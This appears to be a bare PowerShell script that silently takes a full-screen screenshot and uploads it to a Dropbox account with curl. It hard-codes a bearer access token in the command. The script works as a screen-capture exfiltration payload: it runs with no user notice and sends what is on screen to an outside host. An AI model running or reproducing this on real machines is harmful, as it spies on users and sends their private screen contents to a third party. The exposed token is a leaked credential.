#############################################################################
# Capturing a screenshot
#############################################################################
$File = "C:\\MuchFun\\MyFancyScreenshot.bmp"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
# Gather Screen resolution information
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
# Create bitmap using the top-left and bottom-right bounds
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
# Create Graphics object
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
# Capture screen
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
# Save to file
$bitmap.Save($File) 
curl -X POST https://content.dropboxapi.com/2/files/upload  --header "Authorization: Bearer 7JJkhlXm9DUAAAAAAAAAAeeRVJ0MoYaEu70Mvc-7lYDpbTLx8XBThUKfKfq05GFW "  --header "Dropbox-API-Arg: {\"path\": \"/MyFancyScreenshot.bmp\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @MyFancyScreenshot.bmp
#############################################################################
